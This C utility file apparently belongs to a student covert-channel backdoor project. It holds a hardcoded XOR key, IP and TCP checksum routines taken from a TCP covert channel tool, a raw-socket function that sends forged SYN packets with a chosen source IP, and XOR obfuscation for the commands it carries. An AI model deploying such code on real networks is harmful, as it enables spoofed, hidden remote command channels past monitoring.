#include "utils.h"
#include "pktcap.h"

const char xor_key[] = "7Zdl2saWXdZ43LR2LqEhK6JXmwYiw7P95PSA^/jJ(w7Zj,]MhAW6*@D<_:\\X5B5x1Ml_N}3L-y^U:26VJ|ieD&7_\\zP1VDjarPK;u;8]SW-hNS$O)Qn%|Hy@o5^gw;N+r3J@*p&_z6^]z^&kKl0i{}6yrmEl[}p_hB42rZbk'`MX8F@yRCx18YR+%.c~0`p8rG@iY'1\\N!KRpzI/_P|DlD~nUiaEtcXjYgO:/iV3t0]>Ou<zGGn^k84UQShe8r8pdea%7oFvYlp]caIJLTx1-=bv6V@or+a=D,R;a+EH:9(fvvfpO*A5@&zRbLko+RU|#]Rlp*iS'Te1sjYJ)'$,CC!Q:m!{G467+g47q%>Jo~wiE^f[s3O0]+l,yI#kd[BIA`DnqC3`j>v9";
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: in_cksum
-- 
-- DATE: 2014/09/20
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Craig H. Rowland (from the TCP Covert Channel source code)
-- 
-- PROGRAMMER: Craig H. Rowland (from the TCP Covert Channel source code)
-- 
-- INTERFACE: unsigned short in_cksum(unsigned short *addr, int len)
-- 
-- RETURNS: The checksum for the IP header.
-- 
-- NOTES: Algorithm that makes the IP header checksum.
----------------------------------------------------------------------------------------------------------------------*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long          sum;            /* assumes long == 32 bits */
        u_short                oddbyte;
        register u_short       answer;         /* assumes u_short == 16 bits */

        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */

        sum = 0;
        while (nbytes > 1)  {
                sum += *ptr++;
                nbytes -= 2;
        }

        /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
                oddbyte = 0; /* make sure top half is zero */
                *((u_char *) &oddbyte) = *(u_char *)ptr; /* one byte only */
                sum += oddbyte;
        }

        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */
        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits */
        return(answer);
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: tcp_in_cksum
-- 
-- DATE: 2014/09/20
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Murat Balaban (from http://www.enderunix.org/docs/en/rawipspoof/)
-- 
-- PROGRAMMER: Murat Balaban (http://www.enderunix.org/docs/en/rawipspoof/)
-- 
-- INTERFACE: unsigned short tcp_in_cksum(unsigned int src, unsigned int dst, unsigned short *addr, int length)
-- 
-- RETURNS: The checksum for the TCP header. 
-- 
-- NOTES: Algorithm that makes the TCP header checksum.
----------------------------------------------------------------------------------------------------------------------*/
unsigned short tcp_in_cksum(unsigned int src, unsigned int dst, unsigned short *addr, int length)
{
	struct pseudo_header
    	{
      		struct in_addr source_address;
      		struct in_addr dest_address;
      		unsigned char placeholder;
      		unsigned char protocol;
      		unsigned short tcp_length;
      		struct tcphdr tcp;
    	} pseudo_header;

	u_short solution;

	memset(&pseudo_header, 0, sizeof(pseudo_header));
	
	pseudo_header.source_address.s_addr = src;
	pseudo_header.dest_address.s_addr = dst;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons(length);
	memcpy(&(pseudo_header.tcp), addr, length);

	solution = in_cksum((unsigned short *)&pseudo_header, 12 + length);
	
	return (solution);
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: get_line
-- 
-- DATE: 2000/08/01
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Thomas Wolf (from http://home.datacomm.ch/t_wolf/tw/c/getting_input.html )
-- 
-- PROGRAMMER: Thomas Wolf (from http://home.datacomm.ch/t_wolf/tw/c/getting_input.html )
-- 
-- INTERFACE: char *get_line (char *s, size_t n, FILE *f)
-- 
-- RETURNS: pointer to string read from stream. 
-- 
-- NOTES: relatively safe function to read from a stream into a buffer with a max size
----------------------------------------------------------------------------------------------------------------------*/

char *get_line (char *s, size_t n, FILE *f)
{
  	char *p = fgets (s, n, f);

  	if (p != NULL) {
    		size_t last = strlen (s) - 1;
    		if (s[last] == '\n') s[last] = '\0';
  	}
  	return p;
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: usage
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void usage(char * program_name, int mode)
-- 
-- RETURNS: nothing
-- 
-- NOTES: Prints out program usage
----------------------------------------------------------------------------------------------------------------------*/
void usage(char * program_name, int mode){
	if(mode == SERVER_MODE)
	{
		fprintf(stderr, "Usage: %s [-d daemon mode] [-p port]\n", program_name);
		fprintf(stderr, "-d 	- Daemon mode (run the server process in the background)\n");
		fprintf(stderr, " 	- IF NOT SPECIFIED, default is running server in foreground with messages displayed\n");
		fprintf(stderr, "-p 	- Destination Port to capture packets from\n");
		fprintf(stderr, " 	- IF NOT SPECIFIED, default is port 8080\n");
		
	}
	if(mode == CLIENT_MODE)
	{
		fprintf(stderr, "Usage: %s -a host [-p port]\n", program_name);
		fprintf(stderr, "-a 	- Server host to send commands to\n\n");
		fprintf(stderr, "-p 	- Destination port to send commands to\n");
		fprintf(stderr, " 	- IF NOT SPECIFIED, default is port 8080\n");
	}
	exit(1);
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: send_packet
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void send_packet(char * data, const char * src_ip, const char * dest_ip, int dest_port)
-- 
-- RETURNS: nothing
-- 
-- NOTES: Crafts and sends a packet using a raw socket
----------------------------------------------------------------------------------------------------------------------*/
void send_packet(char * data, int data_len, const char * src_ip, const char * dest_ip, int dest_port)
{
        struct ip iph;
        struct tcphdr tcph;
        struct sockaddr_in sin;
	const int on = 1;

        int send_socket, send_len;
        unsigned char * packet;
	
        packet = (unsigned char *)malloc(40 + data_len);

        iph.ip_hl       = 0x5;
        iph.ip_v        = 0x4;
        iph.ip_tos      = 0x0;
        iph.ip_len      = sizeof(struct ip) + sizeof(struct tcphdr) + data_len;
        iph.ip_id       = htonl((int)(255.0 * rand() / (RAND_MAX + 1.0)));
        iph.ip_off      = 0x0;
        iph.ip_ttl      = 0x64;
        iph.ip_sum      = 0;
        iph.ip_p        = IPPROTO_TCP;
        iph.ip_src.s_addr = inet_addr(src_ip);
        iph.ip_dst.s_addr = inet_addr(dest_ip);

        /* create a forged TCP header */
        tcph.th_sport = htons(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
        tcph.th_dport = htons(dest_port);
        tcph.th_seq = htonl(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
        tcph.th_off = sizeof(struct tcphdr) / 4;
        tcph.th_flags = TH_SYN;
        tcph.th_win = htons(31416);
        tcph.th_sum = 0;

        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = iph.ip_dst.s_addr;

        if((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        {
                fprintf(stderr, "Can't create socket\n");
                exit(1);
        }

	if (setsockopt(send_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		fprintf(stderr, "Set sock opt failed\n");
		exit(1);
	}
        iph.ip_sum = in_cksum((unsigned short *)&iph, sizeof(iph));
        tcph.th_sum = tcp_in_cksum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

        memcpy(packet, &iph, sizeof(iph));
        memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
        memcpy(packet + sizeof(iph) + sizeof(tcph), data, data_len);
	
        if((send_len = sendto(send_socket, packet, iph.ip_len, 0, 
                        (struct sockaddr *)&sin, sizeof(struct sockaddr))) < 0)
        {
                fprintf(stderr, "Trouble sending\n");
                exit(1);
        }
        close(send_socket);
	free(packet);
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: get_ip_addr
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: char * get_ip_addr(char * network_interface)
-- 
-- RETURNS: string with current IP address
-- 
-- NOTES: Gets the current IP address of computer
----------------------------------------------------------------------------------------------------------------------*/
char * get_ip_addr(char * network_interface)
{
        int fd;
        struct ifreq ifr;

        fd = socket(AF_INET, SOCK_DGRAM, 0);

        ifr.ifr_addr.sa_family = AF_INET;

        snprintf(ifr.ifr_name, IFNAMSIZ, network_interface);

        ioctl(fd, SIOCGIFADDR, &ifr);

        close(fd);

        return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: xor_cipher
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: char * xor_cipher(char * string, int string_length)
-- 
-- RETURNS: string of encrypted data string
-- 
-- NOTES: XORs a string with key. used as encryption and decryption
----------------------------------------------------------------------------------------------------------------------*/
char * xor_cipher(char * string, int string_length)
{
	char * result;
	int i;
		//, string_length = strlen(string);

	result = (char *)malloc(string_length+1);

	for(i = 0; i < string_length; i++)
		result[i] = string[i] ^ xor_key[(i % strlen((const char *)xor_key))];
	result[string_length]= '\0';
	return result;

}
